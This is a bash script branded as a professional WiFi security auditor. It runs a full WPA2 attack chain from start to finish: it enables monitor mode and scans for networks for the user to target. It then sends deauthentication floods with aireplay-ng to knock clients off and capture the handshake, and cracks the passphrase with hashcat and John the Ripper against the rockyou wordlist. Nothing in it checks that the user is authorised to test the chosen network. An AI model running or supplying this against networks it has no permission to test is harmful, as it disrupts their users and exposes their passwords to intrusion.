#!/bin/bash
# ==============================================================================
# Project: Chu-Mantar-Chu
# Description: Professional WPA2/WPA3 Security Auditing & Password Recovery
# Features: GPU Acceleration (Hashcat), Rule-based Cracking (John the Ripper)
# Version: 2.1 (Bugfix: Scanning & Monitor Mode)
# ==============================================================================

# --- Configuration & Styling ---
set -e 

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' 

# Defaults
DEFAULT_INTERFACE="wlan0"
DEFAULT_WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="/tmp/chu-mantar-chu"
SCAN_TIMEOUT=15
GPU_ENABLED=0

# --- Helper Functions ---

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be executed with root privileges (sudo)."
        exit 1
    fi
}

display_banner() {
    clear
    echo -e "${BLUE}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║                🪄  CHU-MANTAR-CHU  🪄                 ║"
    echo "  ║        Professional WiFi Security Auditor v2.1         ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_dependencies() {
    log_info "Verifying system dependencies..."
    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "john" "hashcat" "wpaclean" "hcxpcapngtool")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        log_warn "Missing dependencies: ${missing[*]}"
        log_info "Attempting to install missing tools..."
        apt update -qq && apt install -y aircrack-ng john hashcat hcxtools -qq
    fi

    if command -v nvidia-smi &> /dev/null || command -v rocm-smi &> /dev/null; then
        log_success "Hardware acceleration (GPU) detected."
        GPU_ENABLED=1
    else
        log_warn "No GPU detected. Falling back to CPU-only mode."
    fi
}

setup_monitor_mode() {
    local iface=$1
    log_info "Cleaning up conflicting processes..."
    airmon-ng check kill &>/dev/null || true
    
    log_info "Attempting to enable monitor mode on $iface..."
    
    # Try multiple methods to enable monitor mode
    if airmon-ng start "$iface" &>/dev/null; then
        # Identify the new monitor interface name
        MON_IFACE=$(iw dev | grep Interface | awk '{print $2}' | grep -E "${iface}mon|${iface}")
    else
        log_warn "airmon-ng failed, attempting manual configuration..."
        ip link set "$iface" down
        iw dev "$iface" set type monitor
        ip link set "$iface" up
        MON_IFACE="$iface"
    fi
    
    if [[ -z "$MON_IFACE" ]]; then
        log_error "Failed to enable monitor mode. Please check your hardware."
        exit 1
    fi
    log_success "Monitor mode active on: $MON_IFACE"
}

scan_and_select() {
    log_info "Scanning for networks... (Wait ${SCAN_TIMEOUT}s)"
    local scan_file="scan_results"
    
    # Clean up old scan files
    rm -f "${scan_file}-01.csv" "${scan_file}-01.kismet.csv" "${scan_file}-01.kismet.netxml" "${scan_file}-01.log.csv"
    
    # Run airodump-ng with timeout
    # We use 'timeout' but also handle the case where airodump might not exit cleanly
    timeout --foreground "$SCAN_TIMEOUT" airodump-ng "$MON_IFACE" --output-format csv -w "$scan_file" >/dev/null 2>&1 || true
    
    if [[ ! -f "${scan_file}-01.csv" ]]; then
        log_error "Scanning failed: No results file generated."
        log_info "Retrying scan with different parameters..."
        timeout --foreground "$SCAN_TIMEOUT" airodump-ng "$MON_IFACE" --output-format csv -w "$scan_file" --write-interval 1 >/dev/null 2>&1 || true
    fi

    if [[ ! -f "${scan_file}-01.csv" ]]; then
        log_error "Fatal: Could not generate scan results. Is your interface working?"
        exit 1
    fi

    echo -e "\n${BLUE}ID\tBSSID\t\t\tCH\tPWR\tESSID${NC}"
    echo "----------------------------------------------------------------------"
    
    # Extract networks, handle potential parsing issues
    local networks=$(awk -F',' 'NR>1 && $1 ~ /:/ {print $1 "|" $4 "|" $9 "|" $14}' "${scan_file}-01.csv" | sed 's/ //g')
    
    if [[ -z "$networks" ]]; then
        log_warn "No networks found. Try moving closer or checking your antenna."
        exit 1
    fi

    local i=1
    while read -r line; do
        IFS='|' read -r bssid channel power essid <<< "$line"
        printf "%d\t%s\t%s\t%s\t%s\n" "$i" "$bssid" "$channel" "$power" "$essid"
        eval "NET_BSSID_$i=$bssid"
        eval "NET_CHAN_$i=$channel"
        ((i++))
    done <<< "$networks" | column -t -s $'\t'
    
    echo -ne "\n${YELLOW}Select Network ID (1-$((i-1))): ${NC}"
    read -r CHOICE
    
    TARGET_BSSID=$(eval echo "\$NET_BSSID_$CHOICE")
    TARGET_CHANNEL=$(eval echo "\$NET_CHAN_$CHOICE")
    
    if [[ -z "$TARGET_BSSID" ]]; then
        log_error "Invalid selection."
        exit 1
    fi
    
    log_success "Target Selected: $TARGET_BSSID on Channel $TARGET_CHANNEL"
}

capture_handshake() {
    log_info "Initiating handshake acquisition for $TARGET_BSSID..."
    local cap_prefix="capture"
    rm -f "${cap_prefix}-01.cap"
    
    # Start capture in background
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$cap_prefix" "$MON_IFACE" >/dev/null 2>&1 &
    local AIRO_PID=$!
    
    # Perform deauthentication flood
    log_info "Sending deauthentication packets to force reconnection..."
    aireplay-ng -0 15 -a "$TARGET_BSSID" "$MON_IFACE" >/dev/null 2>&1 &
    local DEAUTH_PID=$!
    
    # Wait for handshake
    log_info "Monitoring for 4-way handshake..."
    for i in {1..60}; do
        if aircrack-ng "${cap_prefix}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            log_success "Handshake captured successfully!"
            kill $AIRO_PID $DEAUTH_PID 2>/dev/null || true
            return 0
        fi
        echo -ne "${YELLOW}Waiting for handshake... (${i}s)${NC}\r"
        sleep 1
    done
    
    kill $AIRO_PID $DEAUTH_PID 2>/dev/null || true
    log_error "Handshake capture timed out."
    return 1
}

process_hashes() {
    log_info "Converting capture to cracking formats..."
    wpaclean cleaned.cap capture-01.cap &>/dev/null
    hcxpcapngtool -o target.hc22000 cleaned.cap &>/dev/null
    
    if [[ -f "target.hc22000" ]]; then
        log_success "Hashes prepared: target.hc22000"
        return 0
    fi
    return 1
}

crack_engine() {
    log_info "Starting recovery engine..."
    
    # Stage 1: GPU Hashcat
    if [[ $GPU_ENABLED -eq 1 ]]; then
        log_info "Stage 1: Executing Hashcat GPU Attack..."
        # Hashcat 6.x uses -m 22000 for WPA2
        hashcat -m 22000 -a 0 target.hc22000 "$WORDLIST" --force
        if hashcat -m 22000 target.hc22000 --show | grep -q ":"; then
            local pass=$(hashcat -m 22000 target.hc22000 --show | awk -F':' '{print $NF}')
            log_success "PASSWORD RECOVERED: $pass"
            return 0
        fi
    fi

    # Stage 2: John the Ripper
    log_info "Stage 2: Executing John the Ripper Attack..."
    john --wordlist="$WORDLIST" --format=wpapsk target.hc22000
    
    local result=$(john --show --format=wpapsk target.hc22000 | awk -F: 'NR==1 {print $2}')
    if [[ -n "$result" ]]; then
        log_success "PASSWORD RECOVERED: $result"
        return 0
    fi

    log_warn "Recovery failed with current wordlist."
    return 1
}

main() {
    check_root
    display_banner
    check_dependencies

    echo -ne "${YELLOW}Wireless Interface [${DEFAULT_INTERFACE}]: ${NC}"
    read -r USER_IFACE
    INTERFACE=${USER_IFACE:-$DEFAULT_INTERFACE}

    echo -ne "${YELLOW}Wordlist Path [${DEFAULT_WORDLIST}]: ${NC}"
    read -r USER_WL
    WORDLIST=${USER_WL:-$DEFAULT_WORDLIST}

    if [[ ! -f "$WORDLIST" ]]; then
        log_warn "Wordlist not found. Downloading rockyou.txt..."
        curl -sL "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" -o rockyou.txt
        WORDLIST="rockyou.txt"
    fi

    mkdir -p "$OUTPUT_DIR" && cd "$OUTPUT_DIR"
    
    setup_monitor_mode "$INTERFACE"
    scan_and_select
    
    if capture_handshake; then
        process_hashes
        crack_engine
    else
        log_error "Exiting due to capture failure."
        exit 1
    fi

    log_success "Audit Complete. Results saved in $OUTPUT_DIR"
}

main "$@"
